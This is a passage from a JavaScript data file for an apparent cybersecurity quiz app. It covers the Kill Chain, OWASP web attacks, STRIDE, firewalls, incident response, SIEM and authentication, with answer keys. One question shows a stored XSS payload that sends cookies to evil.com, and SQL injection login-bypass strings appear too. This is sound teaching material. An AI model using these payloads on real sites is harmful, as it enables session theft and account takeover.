            }
          },
          {
            q: "An attacker sends a phishing email with a malicious PDF attachment to a target employee. The email reaches the target's inbox. Which Kill Chain stage is the email delivery?",
            opts: ["Reconnaissance", "Weaponisation", "Delivery", "Exploitation"],
            correct: 2,
            hint: "Delivery is when the weapon reaches the target (via email, USB, drive-by download, etc.).",
            wrongReasons: {
              0: "Reconnaissance is the information gathering phase before the attack weapon is built.",
              1: "Weaponisation creates the malicious PDF. Delivery is sending it.",
              3: "Exploitation happens when the target opens the PDF and code executes."
            }
          },
          {
            q: "An attacker has a foothold inside a corporate network and uses a remote access tool to issue commands to the compromised machine, directing it to scan the internal network. What Kill Chain stage is this?",
            opts: ["Actions on Objectives", "Installation", "Command & Control (C2)", "Weaponisation"],
            correct: 2,
            hint: "C2 is the stage where the attacker remotely controls the compromised machine.",
            wrongReasons: {
              0: "Actions on Objectives is the final stage where the attacker's goal is achieved.",
              1: "Installation puts the backdoor in place. C2 uses it.",
              3: "Weaponisation creates the initial exploit, not remote control."
            }
          },
          {
            q: "A security team detects unusual outbound network traffic to a suspicious external IP address from an internal server. By blocking this connection at the firewall, they prevent what Kill Chain stage?",
            opts: ["Reconnaisance", "Exploitation", "Command & Control (C2)", "Actions on Objectives"],
            correct: 2,
            hint: "Blocking outbound connections to attacker servers disrupts the C2 stage.",
            wrongReasons: {
              0: "Reconnaissance is the first stage – the attacker is already past it.",
              1: "Exploitation has already occurred if the server is compromised.",
              3: "Blocking C2 prevents Actions on Objectives from completing, but what was directly blocked is C2."
            }
          }
        ]
      },
      {
        id: "3-2", title: "Web Application Attacks", slides: "23-50",
        concept: {
          title: "Web Application Attacks",
          body: [
            { type: "section", text: "OWASP Top 10 Key Vulnerabilities" },
            { type: "bullet", text: "INJECTION – untrusted data interpreted as code (SQL, OS, LDAP injection)." },
            { type: "bullet", text: "BROKEN AUTHENTICATION – weak sessions, missing MFA, exposed credentials." },
            { type: "bullet", text: "SENSITIVE DATA EXPOSURE – transmitting sensitive data without encryption." },
            { type: "bullet", text: "XSS (Cross-Site Scripting) – injecting malicious scripts into web pages viewed by others." },
            { type: "bullet", text: "BROKEN ACCESS CONTROL – users can access data/functions beyond their permissions." },
            { type: "bullet", text: "SECURITY MISCONFIGURATION – default settings, open cloud storage, verbose errors." },
            { type: "bullet", text: "INSECURE DESERIALIZATION – manipulating serialized objects to execute code." },
            { type: "bullet", text: "USING COMPONENTS WITH KNOWN VULNERABILITIES – outdated libraries." },
            { type: "empty" },
            { type: "section", text: "SQL Injection" },
            { type: "bullet", text: "User input is concatenated directly into SQL queries." },
            { type: "bullet", text: "Input like: ' OR '1'='1 can bypass authentication." },
            { type: "bullet", text: "Defense: parameterised queries / prepared statements." },
          ]
        },
        questions: [
          {
            q: "A login form accepts username: admin'-- and password: anything. The resulting SQL query bypasses authentication entirely, logging the attacker in as admin. What vulnerability is this?",
            opts: ["Cross-site scripting", "SQL Injection", "Broken access control", "CSRF"],
            correct: 1,
            hint: "SQL Injection occurs when user input is inserted directly into SQL queries without sanitisation.",
            wrongReasons: {
              0: "XSS injects malicious JavaScript into web pages, not SQL queries.",
              2: "Broken access control is about users accessing beyond their permissions after login.",
              3: "CSRF tricks logged-in users into making unintended requests."
            }
          },
          {
            q: "A developer concatenates user input directly into a database query string. Which defense prevents this from becoming a SQL injection vulnerability?",
            opts: ["Encrypting the database", "Using parameterised queries", "Adding a firewall", "Requiring HTTPS"],
            correct: 1,
            hint: "Parameterised queries separate the SQL code from the data, preventing injection.",
            wrongReasons: {
              0: "Database encryption protects stored data but doesn't prevent injection attacks.",
              2: "A firewall filters network traffic but doesn't prevent application-level SQL injection.",
              3: "HTTPS protects data in transit but doesn't prevent SQL injection."
            }
          },
          {
            q: "An attacker posts a comment on a blog containing: <script>document.location='http://evil.com/?c='+document.cookie</script>. When other users view the comment, their session cookies are stolen. What attack is this?",
            opts: ["SQL Injection", "CSRF", "Stored XSS", "Broken Authentication"],
            correct: 2,
            hint: "Stored XSS injects malicious scripts that are saved server-side and executed when viewed by victims.",
            wrongReasons: {
              0: "SQL injection targets database queries, not browser script execution.",
              1: "CSRF tricks users into making unintended requests, not executing scripts.",
              3: "Broken authentication involves weak login mechanisms."
            }
          },
          {
            q: "A web application uses a publicly accessible Amazon S3 bucket to store customer documents due to a misconfiguration. An attacker discovers and downloads all files. What vulnerability caused this?",
            opts: ["SQL Injection", "XSS", "Security Misconfiguration", "Broken Authentication"],
            correct: 2,
            hint: "Security misconfiguration includes improperly secured cloud storage.",
            wrongReasons: {
              0: "SQL injection targets database queries. The bucket was just misconfigured as public.",
              1: "XSS is about script injection in web pages.",
              3: "Broken authentication is about weak login systems."
            }
          },
          {
            q: "A user with a regular account changes a URL from /admin/users to /admin/delete-all-users and successfully deletes all accounts. What OWASP vulnerability is this?",
            opts: ["SQL Injection", "Broken Access Control", "XSS", "Sensitive Data Exposure"],
            correct: 1,
            hint: "Broken Access Control allows users to access resources or perform actions beyond their permissions.",
            wrongReasons: {
              0: "SQL injection manipulates database queries directly.",
              2: "XSS injects malicious scripts into web pages.",
              3: "Sensitive data exposure is about unencrypted transmission of sensitive information."
            }
          }
        ]
      },
      {
        id: "3-3", title: "Threat Modeling & Risk Assessment", slides: "51-80",
        concept: {
          title: "Threat Modeling & Risk Assessment",
          body: [
            { type: "section", text: "Threat Modeling" },
            { type: "line", text: "A structured process for identifying, evaluating, and addressing threats to a system." },
            { type: "empty" },
            { type: "section", text: "STRIDE Framework" },
            { type: "bullet", text: "S – Spoofing (impersonating another user)" },
            { type: "bullet", text: "T – Tampering (unauthorised data modification)" },
            { type: "bullet", text: "R – Repudiation (denying an action was performed)" },
            { type: "bullet", text: "I – Information Disclosure (unauthorised data access)" },
            { type: "bullet", text: "D – Denial of Service (disrupting availability)" },
            { type: "bullet", text: "E – Elevation of Privilege (gaining higher permissions)" },
            { type: "empty" },
            { type: "section", text: "Risk Assessment" },
            { type: "bullet", text: "QUALITATIVE – subjective rating (High/Medium/Low)." },
            { type: "bullet", text: "QUANTITATIVE – numerical values (ALE = ARO × SLE)." },
            { type: "bullet", text: "Risk Treatment: Accept, Avoid, Transfer (insurance), Mitigate (controls)." },
          ]
        },
        questions: [
          {
            q: "A threat modeler identifies that an attacker could pretend to be a legitimate administrator by stealing their credentials. Which STRIDE category does this represent?",
            opts: ["Tampering", "Repudiation", "Spoofing", "Elevation of Privilege"],
            correct: 2,
            hint: "Spoofing means impersonating another user or system identity.",
            wrongReasons: {
              0: "Tampering is about unauthorised modification of data.",
              1: "Repudiation is about denying that an action was performed.",
              3: "Elevation of Privilege is about gaining higher-level access rights."
            }
          },
          {
            q: "A user modifies a web form field to change another user's email address. Which STRIDE threat category does this represent?",
            opts: ["Spoofing", "Tampering", "Information Disclosure", "Denial of Service"],
            correct: 1,
            hint: "Tampering means unauthorised modification of data.",
            wrongReasons: {
              0: "Spoofing is about pretending to be another identity.",
              2: "Information Disclosure is about unauthorised access to data, not modification.",
              3: "Denial of Service is about disrupting availability."
            }
          },
          {
            q: "A company's server processes 200 successful attacks per year. Each attack costs an average of $5,000 in damages. What is the company's Annual Loss Expectancy (ALE)?",
            opts: ["$5,000", "$200", "$1,000,000", "$25,000"],
            correct: 2,
            hint: "ALE = ARO (Annual Rate of Occurrence) × SLE (Single Loss Expectancy). 200 × $5,000 = $1,000,000.",
            wrongReasons: {
              0: "$5,000 is the Single Loss Expectancy (SLE) per incident.",
              1: "$200 is the number of incidents (ARO), not a financial amount.",
              3: "$25,000 is not a result of 200 × $5,000."
            }
          },
          {
            q: "A company decides to purchase cyber insurance to cover potential losses from data breaches instead of spending heavily on preventive controls. What risk treatment strategy is this?",
            opts: ["Risk avoidance", "Risk acceptance", "Risk transfer", "Risk mitigation"],
            correct: 2,
            hint: "Risk transfer means shifting the financial impact to a third party, like insurance.",
            wrongReasons: {
              0: "Risk avoidance means stopping the risky activity entirely.",
              1: "Risk acceptance means acknowledging the risk and doing nothing about it.",
              3: "Risk mitigation means implementing controls to reduce the risk."
            }
          },
          {
            q: "A security team rates a vulnerability as 'High Risk' based on its likelihood and potential impact, without assigning specific dollar values. What type of risk assessment is this?",
            opts: ["Quantitative risk assessment", "Qualitative risk assessment", "Annual Loss Expectancy calculation", "STRIDE analysis"],
            correct: 1,
            hint: "Qualitative assessment uses subjective ratings (High/Medium/Low) rather than precise numbers.",
            wrongReasons: {
              0: "Quantitative assessment assigns numerical monetary values to risks.",
              2: "ALE is a specific calculation within quantitative assessment.",
              3: "STRIDE is a threat modeling framework, not a risk rating method."
            }
          }
        ]
      }
    ]
  },

  // ─────────────────────────────────────────────────────
  // MODULE 3 – Cybersecurity Defense
  // ─────────────────────────────────────────────────────
  {
    id: 4, num: "3",
    title: "Cybersecurity Defense",
    icon: "🛡️",
    desc: "Firewalls, IDS/IPS, VPNs, incident response & forensics",
    color: "#00ff9d",
    levels: [
      {
        id: "4-1", title: "Network Security Controls", slides: "1-30",
        concept: {
          title: "Network Security Controls",
          body: [
            { type: "section", text: "Firewalls" },
            { type: "bullet", text: "STATELESS – filters packets based on source/destination IP and port alone." },
            { type: "bullet", text: "STATEFUL – tracks the state of active connections; blocks unexpected packets." },
            { type: "bullet", text: "NGFW (Next-Gen Firewall) – deep packet inspection, application awareness, IPS integration." },
            { type: "bullet", text: "WAF (Web Application Firewall) – inspects HTTP/HTTPS traffic; protects web apps." },
            { type: "empty" },
            { type: "section", text: "IDS vs IPS" },
            { type: "bullet", text: "IDS (Intrusion Detection System) – monitors and ALERTS; does not block." },
            { type: "bullet", text: "IPS (Intrusion Prevention System) – monitors and BLOCKS automatically." },
            { type: "bullet", text: "SIGNATURE-BASED – detects known patterns. Cannot detect new attacks." },
            { type: "bullet", text: "ANOMALY-BASED – detects deviations from normal. Can detect new attacks." },
            { type: "empty" },
            { type: "section", text: "VPN & DMZ" },
            { type: "bullet", text: "VPN – encrypts traffic between client and network over public internet." },
            { type: "bullet", text: "DMZ – network segment between internet and internal network for public-facing services." },
          ]
        },
        questions: [
          {
            q: "A company's firewall detects and automatically blocks a malicious packet trying to enter the network. What type of security device is this?",
            opts: ["IDS", "IPS", "WAF", "VPN"],
            correct: 1,
            hint: "An IPS (Intrusion Prevention System) monitors and automatically blocks threats.",
            wrongReasons: {
              0: "An IDS monitors and alerts, but does NOT block traffic automatically.",
              2: "A WAF specifically protects web applications via HTTP/HTTPS traffic.",
              3: "A VPN encrypts traffic; it doesn't detect and block malicious packets."
            }
          },
          {
            q: "A company places its public web server in a separate network segment between the internet and the internal corporate network, so that even if the web server is compromised, internal systems are protected. What is this segment called?",
            opts: ["VPN", "DMZ", "Honeypot", "VLAN"],
            correct: 1,
            hint: "A DMZ (Demilitarized Zone) is a buffer zone between the internet and the internal network.",
            wrongReasons: {
              0: "A VPN is a secure encrypted tunnel, not a network segment.",
              2: "A honeypot is a decoy system to attract and study attackers.",
              3: "A VLAN segments a network logically, but a DMZ specifically positions public-facing services."
            }
          },
          {
            q: "An IDS detects unusual network traffic patterns that don't match any known attack signatures but deviate significantly from normal behaviour. What detection method is being used?",
            opts: ["Signature-based detection", "Anomaly-based detection", "Heuristic-based detection", "Stateful packet inspection"],
            correct: 1,
            hint: "Anomaly-based detection identifies deviations from a normal baseline.",
            wrongReasons: {
              0: "Signature-based detection matches against known attack patterns, not deviations.",
              2: "Heuristic detection is a form of anomaly detection — anomaly-based is the broader correct term here.",
              3: "Stateful packet inspection tracks connection states; it's a firewall technique."
            }
          },
          {
            q: "An employee works from home and connects to the company network through an encrypted tunnel so their traffic is protected even over public internet. What technology enables this?",
            opts: ["DMZ", "Firewall", "VPN", "IDS"],
            correct: 2,
            hint: "A VPN (Virtual Private Network) creates an encrypted tunnel over public networks.",
            wrongReasons: {
              0: "A DMZ is a network segment for public-facing servers.",
              1: "A firewall filters traffic; it doesn't create encrypted tunnels for remote workers.",
              3: "An IDS monitors and alerts on traffic; it doesn't encrypt remote connections."
            }
          },
          {
            q: "A Next-Generation Firewall (NGFW) can do something a traditional stateful firewall cannot. Which capability is unique to NGFWs?",
            opts: ["Filtering packets by IP address", "Tracking the state of network connections", "Deep packet inspection and application-layer awareness", "Blocking traffic based on port numbers"],
            correct: 2,
            hint: "NGFWs can inspect the content and application context inside packets, not just headers.",
            wrongReasons: {
              0: "Traditional firewalls can filter by IP address — that's a basic capability.",
              1: "Stateful firewalls already track connection states.",
              3: "Port-based filtering is a basic firewall capability, not unique to NGFWs."
            }
          }
        ]
      },
      {
        id: "4-2", title: "Incident Response & Forensics", slides: "31-60",
        concept: {
          title: "Incident Response & Digital Forensics",
          body: [
            { type: "section", text: "Incident Response Phases (NIST)" },
            { type: "bullet", text: "1. PREPARATION – establish IR team, tools, plans." },
            { type: "bullet", text: "2. IDENTIFICATION – detect and confirm an incident has occurred." },
            { type: "bullet", text: "3. CONTAINMENT – isolate affected systems to stop spread." },
            { type: "bullet", text: "4. ERADICATION – remove malware, close vulnerabilities." },
            { type: "bullet", text: "5. RECOVERY – restore systems to normal operation." },
            { type: "bullet", text: "6. LESSONS LEARNED – document what happened and improve defenses." },
            { type: "empty" },
            { type: "section", text: "Digital Forensics" },
            { type: "bullet", text: "CHAIN OF CUSTODY – documentation proving evidence integrity." },
            { type: "bullet", text: "ORDER OF VOLATILITY – collect most volatile data first (RAM → disk → network logs)." },
            { type: "bullet", text: "FORENSIC IMAGE – exact bit-by-bit copy of storage device." },
            { type: "bullet", text: "WRITE BLOCKER – device that prevents any writes to original evidence." },
            { type: "bullet", text: "INTEGRITY VERIFICATION – hashing to confirm evidence hasn't changed." },
          ]
        },
        questions: [
          {
            q: "After discovering ransomware on a server, the IT team immediately disconnects it from the network before investigating. Which incident response phase does this represent?",
            opts: ["Preparation", "Identification", "Containment", "Eradication"],
            correct: 2,
            hint: "Containment isolates affected systems to prevent the spread of the incident.",
            wrongReasons: {
              0: "Preparation happens before any incident — it's about building the IR capability.",
              1: "Identification is detecting and confirming an incident, which already happened.",
              3: "Eradication removes the malware — disconnecting the server stops spread first."
            }
          },
          {
            q: "A forensic investigator connects a suspect hard drive using a device that allows reading data without writing any changes back to the drive. What device is this?",
            opts: ["Network tap", "Write blocker", "Packet sniffer", "IDS sensor"],
            correct: 1,
            hint: "A write blocker prevents any writes to the original evidence during forensic examination.",
            wrongReasons: {
              0: "A network tap captures network packets, not protects disk evidence.",
              2: "A packet sniffer captures network traffic, not disk evidence.",
              3: "An IDS sensor monitors network traffic for intrusions."
            }
          },
          {
            q: "A forensic investigator arrives at a crime scene with multiple active computers, phones, and network equipment. In what order should they collect digital evidence?",
            opts: ["Disk images first, then RAM, then network logs", "RAM first, then disk images, then network logs", "Network logs first, then disk, then RAM", "The order doesn't matter in digital forensics"],
            correct: 1,
            hint: "Collect the most volatile data first — RAM data is lost when power is cut.",
            wrongReasons: {
              0: "Disk data persists without power. RAM is far more volatile and must be captured first.",
              2: "Network logs often reside on remote servers and are less volatile than local RAM.",
              3: "The order absolutely matters — volatile data (RAM) is lost if power is cut first."
            }
          },
          {
            q: "After an incident, the security team documents exactly what happened, what vulnerabilities were exploited, how they responded, and what could be improved. Which phase of incident response is this?",
            opts: ["Preparation", "Recovery", "Eradication", "Lessons Learned"],
            correct: 3,
            hint: "Lessons Learned is the final phase — documenting the incident and improving defenses.",
            wrongReasons: {
              0: "Preparation is before any incident occurs.",
              1: "Recovery restores systems to normal operation.",
              2: "Eradication removes the threat from systems."
            }
          },
          {
            q: "A forensic analyst hashes a disk image using SHA-256 when they receive it, and hashes it again after analysis. Both hashes match. What does this confirm?",
            opts: ["The disk was properly write-blocked", "The evidence has not been modified and integrity is maintained", "The analysis was completed correctly", "The attacker did not encrypt any data"],
            correct: 1,
            hint: "Matching hash values confirm the evidence has not been altered.",
            wrongReasons: {
              0: "Write-blocking is a separate physical step, not confirmed by matching hashes alone.",
              2: "Analysis quality isn't confirmed by hash matching — only evidence integrity.",
              3: "Hash matching says nothing about attacker encryption."
            }
          }
        ]
      },
      {
        id: "4-3", title: "Security Monitoring & SIEM", slides: "61-90",
        concept: {
          title: "Security Monitoring & SIEM",
          body: [
            { type: "section", text: "Security Monitoring" },
            { type: "bullet", text: "LOGS – records of events across systems, applications, and networks." },
            { type: "bullet", text: "SIEM (Security Information & Event Management) – centralises log collection, correlation, and alerting." },
            { type: "bullet", text: "SOC (Security Operations Center) – team monitoring and responding to security events 24/7." },
            { type: "empty" },
            { type: "section", text: "Key SIEM Capabilities" },
            { type: "bullet", text: "Log aggregation – collects logs from many sources." },
            { type: "bullet", text: "Correlation – identifies patterns across multiple events." },
            { type: "bullet", text: "Alerting – notifies analysts of suspicious activity." },
            { type: "bullet", text: "Dashboards – visualise security posture in real time." },
            { type: "bullet", text: "Forensic analysis – investigate past events." },
            { type: "empty" },
            { type: "section", text: "Threat Intelligence" },
            { type: "bullet", text: "IOC (Indicator of Compromise) – evidence a system has been breached (malicious IP, file hash, domain)." },
            { type: "bullet", text: "THREAT INTEL SHARING – organisations share IOCs to collectively defend faster." },
          ]
        },
        questions: [
          {
            q: "A security team uses a centralised platform that collects logs from firewalls, servers, and applications, then correlates events to identify a coordinated attack across multiple systems. What is this platform?",
            opts: ["Firewall", "IDS", "SIEM", "VPN"],
            correct: 2,
            hint: "SIEM (Security Information and Event Management) centralises log collection and correlation.",
            wrongReasons: {
              0: "A firewall filters traffic; it doesn't collect and correlate logs from multiple sources.",
              1: "An IDS monitors traffic and alerts on known patterns, but doesn't centralise log analysis.",
              3: "A VPN creates encrypted tunnels for secure communication."
            }
          },
          {
            q: "A threat intelligence feed provides a list of known malicious IP addresses, file hashes of malware samples, and suspicious domain names. What are these called?",
            opts: ["CVEs", "Indicators of Compromise (IOCs)", "Zero-days", "Kill chain stages"],
            correct: 1,
            hint: "Indicators of Compromise (IOCs) are evidence that a system may have been breached.",
            wrongReasons: {
              0: "CVEs (Common Vulnerabilities and Exposures) are specific software vulnerability identifiers.",
              2: "Zero-days are unknown vulnerabilities, not lists of malicious indicators.",
              3: "Kill chain stages describe attack phases, not specific malicious artefacts."
            }
          },
          {
            q: "A company discovers attackers exfiltrated data for 6 months before being detected. What is the time between the breach occurring and its discovery called?",
            opts: ["Recovery Time Objective (RTO)", "Mean Time to Detect (MTTD)", "Recovery Point Objective (RPO)", "Mean Time to Respond (MTTR)"],
            correct: 1,
            hint: "Mean Time to Detect (MTTD) measures how long it takes to discover a breach.",
            wrongReasons: {
              0: "RTO defines how quickly systems must be restored after an incident.",
              2: "RPO defines how much data loss is acceptable in terms of time.",
              3: "MTTR measures how long it takes to respond and remediate after detection."
            }
          }
        ]
      }
    ]
  },

  // ─────────────────────────────────────────────────────
  // MODULE 4 – Identity, Authentication & Access Control
  // ─────────────────────────────────────────────────────
  {
    id: 5, num: "4",
    title: "Identity & Access Control",
    icon: "🔑",
    desc: "Authentication, MFA, access control models, Zero Trust & identity attacks",
    color: "#7b5cf5",
    levels: [
      {
        id: "5-1", title: "Core Identity Concepts", slides: "2-18",
        concept: {
          title: "Core Identity Concepts",
          body: [
            { type: "bullet", text: "IDENTITY = digital representation of an entity (human, service, device)." },
            { type: "bullet", text: "IDENTITY vs ACCOUNT: Identity is the real-world entity. Account is how it's represented in a specific system. One identity can have multiple accounts." },
            { type: "bullet", text: "IDENTIFICATION = claiming an identity (e.g., entering username)." },
            { type: "bullet", text: "AUTHENTICATION (AuthN) = verifying that claim (e.g., entering password)." },
            { type: "bullet", text: "AUTHORIZATION (AuthZ) = determining what you're allowed to do." },
            { type: "bullet", text: "AAA Model: Authentication + Authorization + Accounting (records activity)." },
            { type: "bullet", text: "SESSION = maintains authenticated state across requests (cookies, tokens)." },
            { type: "bullet", text: "TRUST BOUNDARY = where trust assumptions change. Requires validation." },
          ]
        },
        questions: [
          {
            q: "A user types their username into a login form. What security action is this?",
            opts: ["Authentication", "Identification", "Authorization", "Accounting"],
            correct: 1,
            hint: "Identification is 'the act of claiming an identity.' Authentication verifies it.",
            wrongReasons: {
              0: "Authentication verifies the claim. Typing a username is just claiming identity.",
              2: "Authorization decides permissions AFTER authentication.",
              3: "Accounting records activity, not the initial claim."
            }
          },
          {
            q: "A student logs into a university system with valid credentials. The system then decides the student can view grades but cannot modify them. What is the second step called?",
            opts: ["Authentication", "Identification", "Authorization", "Session management"],
            correct: 2,
            hint: "Authorization answers 'What are you allowed to do?' and happens AFTER authentication.",
            wrongReasons: {
              0: "Authentication was the login step. The system already knows who they are.",
              1: "Identification was entering the username.",
              3: "Session management maintains state, not permission decisions."
            }
          },
          {
            q: "In the AAA model, what does the third 'A' (Accounting) do?",
            opts: ["Verifies user identity", "Determines allowed actions", "Records user activity for monitoring and auditing", "Encrypts user passwords"],
            correct: 2,
            hint: "Accounting 'records user activity for monitoring and auditing.'",
            wrongReasons: {
              0: "That's Authentication.",
              1: "That's Authorization.",
              3: "Encryption is not part of AAA."
            }
          },
          {
            q: "After a user successfully logs in, the system uses a cookie to remember they are authenticated across multiple page requests. What is this mechanism?",
            opts: ["Trust boundary", "Session", "Access control matrix", "Identity provider"],
            correct: 1,
            hint: "Sessions 'maintain the user's authenticated state across requests.'",
            wrongReasons: {
              0: "Trust boundaries are where assumptions change.",
              2: "Access control matrix defines permissions.",
              3: "Identity provider manages identities externally."
            }
          },
          {
            q: "A single person has a university email account, a personal Gmail account, and a work Microsoft account. Each has different permissions. What concept explains this?",
            opts: ["One identity cannot have multiple accounts", "Identity vs Account distinction", "Authentication is the same as authorization", "Sessions are permanent"],
            correct: 1,
            hint: "'Identity refers to the real-world entity. Account is how that identity is represented in a specific system.'",
            wrongReasons: {
              0: "A single identity CAN have multiple accounts.",
              2: "They are different concepts.",
              3: "Sessions are temporary, not permanent."
            }
          }
        ]
      },
      {
        id: "5-2", title: "Password Weaknesses & Attacks", slides: "19-32",
        concept: {
          title: "Password Weaknesses & Attacks",
          body: [
            { type: "bullet", text: "BRUTE-FORCE = trying every possible combination." },
            { type: "bullet", text: "DICTIONARY ATTACK = using lists of common passwords. Much faster than brute-force." },
            { type: "bullet", text: "CREDENTIAL STUFFING = using leaked credentials from one breach on other platforms." },
            { type: "bullet", text: "KEYLOGGER = malware that records keystrokes including passwords." },
            { type: "bullet", text: "PASSWORD STORAGE: never store plaintext. Use HASHING + SALTING." },
            { type: "bullet", text: "SALTING = adds random data before hashing so same passwords produce different hashes." },
            { type: "bullet", text: "Key insight: Passwords alone cannot provide strong security guarantees." },
          ]
        },
        questions: [
          {
            q: "An attacker uses a list of the 10,000 most common passwords to try logging into many accounts. What attack is this?",
            opts: ["Brute-force attack", "Dictionary attack", "Credential stuffing attack", "Session hijacking"],
            correct: 1,
            hint: "Dictionary attacks use 'lists of common passwords' and are 'much faster than brute force.'",
            wrongReasons: {
              0: "Brute-force tries ALL combinations, not just common ones.",
              2: "Credential stuffing uses leaked credentials from other breaches.",
              3: "Session hijacking steals active sessions, not passwords."
            }
          },
          {
            q: "An attacker obtains a database of usernames and passwords from a breached shopping website and automatically tries them on banking websites. What attack is this?",
            opts: ["Brute-force attack", "Dictionary attack", "Credential stuffing attack", "Phishing attack"],
            correct: 2,
            hint: "Credential stuffing uses 'credentials leaked from previous breaches' tried on other platforms.",
            wrongReasons: {
              0: "Brute-force tries random combinations.",
              1: "Dictionary uses common password lists, not leaked credentials.",
              3: "Phishing tricks users into revealing passwords. This uses already-stolen data."
            }
          },
          {
            q: "Even if two users have the same password, their stored hashes should look different. What technique ensures this?",
            opts: ["Hashing alone", "Salting", "Encryption", "Compression"],
            correct: 1,
            hint: "Salting 'adds random data before hashing' so even identical passwords produce different hashes.",
            wrongReasons: {
              0: "Hashing alone would produce the same hash for the same password.",
              2: "Encryption is reversible. Hashing is one-way.",
              3: "Compression reduces size, not a security mechanism."
            }
          },
          {
            q: "Malicious software records every keystroke a user types, including passwords, and sends them to an attacker. What is this called?",
            opts: ["Ransomware", "Keylogger", "Worm", "Trojan"],
            correct: 1,
            hint: "'Keyloggers recording keystrokes' are a form of password capture via malware.",
            wrongReasons: {
              0: "Ransomware encrypts files and demands payment.",
              2: "Worms self-propagate across networks.",
              3: "Trojan disguises itself as legitimate software."
            }
          },
          {
            q: "Which statement about passwords is TRUE?",
            opts: ["Passwords alone provide strong security guarantees", "Even well-implemented systems can be compromised through user behaviour", "Strong passwords are immune to keyloggers", "Plaintext password storage is acceptable with a strong firewall"],
            correct: 1,
            hint: "'Even well-implemented systems can be compromised' and 'passwords rely heavily on user behaviour.'",
            wrongReasons: {
              0: "'Passwords alone cannot provide strong security guarantees.'",
              2: "Keyloggers capture ANY password typed, strong or weak.",
              3: "Plaintext storage is NEVER acceptable."
            }
          }
        ]
      },
      {
        id: "5-3", title: "MFA & Strengthening Authentication", slides: "33-43",
        concept: {
          title: "MFA & Strengthening Authentication",
          body: [
            { type: "bullet", text: "MFA = requires two or more INDEPENDENT proofs of identity." },
            { type: "bullet", text: "Factors: Something you KNOW (password), HAVE (phone, token), ARE (biometric)." },
            { type: "bullet", text: "OTP = One-Time Password. Temporary codes via SMS or authenticator app." },
            { type: "bullet", text: "Hardware tokens and authenticator apps are more secure than SMS." },
            { type: "bullet", text: "BIOMETRIC: convenient but cannot be changed if compromised." },
            { type: "bullet", text: "Limitations: SMS interception, device compromise, real-time phishing of OTP." },
            { type: "bullet", text: "PASSWORDLESS = eliminate passwords. Uses biometrics + cryptographic auth (Passkeys, FIDO2)." },
          ]
        },
        questions: [
          {
            q: "A user must enter their password AND a code sent to their phone to log in. What security mechanism is this?",
            opts: ["Single sign-on", "Multi-factor authentication (MFA)", "Network segmentation", "Rate limiting"],
            correct: 1,
            hint: "MFA 'requires users to provide two or more independent proofs of identity.'",
            wrongReasons: {
              0: "SSO lets users log in once for multiple services.",
              2: "Network segmentation divides network zones.",
              3: "Rate limiting restricts request frequency."
            }
          },
          {
            q: "An authentication system requires a fingerprint scan AND a hardware security key. Which two factor categories are used?",
            opts: ["Knowledge and possession", "Possession and inherence", "Inherence and knowledge", "Location and time"],
            correct: 1,
            hint: "Fingerprint = 'something you ARE' (inherence). Hardware key = 'something you HAVE' (possession).",
            wrongReasons: {
              0: "Knowledge = something you know (password). No password is used here.",
              2: "Knowledge is not used. Fingerprint is inherence, key is possession.",
              3: "Location and time are context factors, not primary factor categories."
            }
          },
          {
            q: "A bank sends a one-time code via SMS for login verification. What is a key limitation of this approach?",
            opts: ["SMS codes never expire", "SMS can be intercepted by attackers", "Users cannot receive SMS messages", "SMS is too expensive"],
            correct: 1,
            hint: "MFA limitations include 'SMS interception' and 'device compromise.'",
            wrongReasons: {
              0: "SMS codes do expire (short validity).",
              2: "Most users can receive SMS; this isn't the security limitation.",
              3: "Cost is not the security concern."
            }
          },
          {
            q: "An attacker creates a fake login page that looks identical to a real banking site. When a user enters their password and OTP, the attacker forwards both to the real site instantly, gaining access. What does this demonstrate?",
            opts: ["MFA is completely unbreakable", "MFA can be bypassed through phishing", "Hardware tokens are useless", "Biometrics are always better"],
            correct: 1,
            hint: "'Attackers use fake login pages to capture credentials. User enters OTP → attacker forwards instantly.'",
            wrongReasons: {
              0: "MFA 'does not eliminate risk.'",
              2: "Hardware tokens are still more secure than SMS.",
              3: "Biometrics have their own limitations (cannot be changed if compromised)."
            }
          },
          {
            q: "Which modern authentication approach aims to eliminate passwords entirely, using biometrics and cryptographic authentication?",
            opts: ["Multi-factor authentication", "Passwordless authentication (FIDO2/Passkeys)", "Single sign-on", "Risk-based authentication"],
            correct: 1,
            hint: "'Toward Passwordless Authentication' uses biometrics, secure devices, and cryptographic authentication.",
            wrongReasons: {
              0: "MFA still uses passwords as one factor.",
              2: "SSO centralises login but doesn't eliminate passwords.",
              3: "Risk-based adapts requirements based on context but doesn't eliminate passwords."
            }
          }
        ]
      },
      {
        id: "5-4", title: "Access Control Models", slides: "58-74",
        concept: {
          title: "Access Control Models",
          body: [
            { type: "bullet", text: "DAC (Discretionary AC): Resource OWNER decides who can access. Common in personal systems. Flexible." },
            { type: "bullet", text: "MAC (Mandatory AC): System ENFORCES decisions based on security labels. Cannot be overridden. Military/government." },
            { type: "bullet", text: "RBAC (Role-Based AC): Permissions assigned to ROLES, users inherit via roles. Easy to manage at scale. Risk: role explosion." },
            { type: "bullet", text: "ABAC (Attribute-Based AC): Decisions based on ATTRIBUTES (role, department, time, location). Highly flexible. Complex." },
            { type: "empty" },
            { type: "section", text: "Key Principles" },
            { type: "bullet", text: "LEAST PRIVILEGE – only permissions needed." },
            { type: "bullet", text: "NEED-TO-KNOW – access only if necessary for a task." },
            { type: "bullet", text: "SEPARATION OF DUTIES – critical tasks divided among multiple users." },
          ]
        },
        questions: [
          {
            q: "In a system where the creator of a file decides who can read or edit it, what access control model is this?",
            opts: ["Mandatory Access Control (MAC)", "Discretionary Access Control (DAC)", "Role-Based Access Control (RBAC)", "Attribute-Based Access Control (ABAC)"],
            correct: 1,
            hint: "DAC 'access decisions are controlled by the resource owner.'",
            wrongReasons: {
              0: "MAC is system-enforced. Users cannot override.",
              2: "RBAC assigns permissions to roles, not resource owners.",
              3: "ABAC uses attributes, not owner discretion."
            }
          },
          {
            q: "A military system classifies documents as 'Secret' and 'Top Secret.' A user with 'Secret' clearance CANNOT access 'Top Secret' documents, and no user can override this. What model?",
            opts: ["DAC", "MAC", "RBAC", "ABAC"],
            correct: 1,
            hint: "MAC 'access decisions enforced by the system' based on 'security labels and classifications.' Users cannot override.",
            wrongReasons: {
              0: "DAC lets owners override. Users cannot override in this scenario.",
              2: "RBAC uses roles, not security labels/clearances.",
              3: "ABAC uses multiple attributes, not just classification labels."
            }
          },
          {
            q: "A hospital assigns permissions to roles: 'Doctor' can view patient records, 'Nurse' can update vitals, 'Admin' can manage users. All doctors inherit the same permissions. What model?",
            opts: ["DAC", "MAC", "RBAC", "ABAC"],
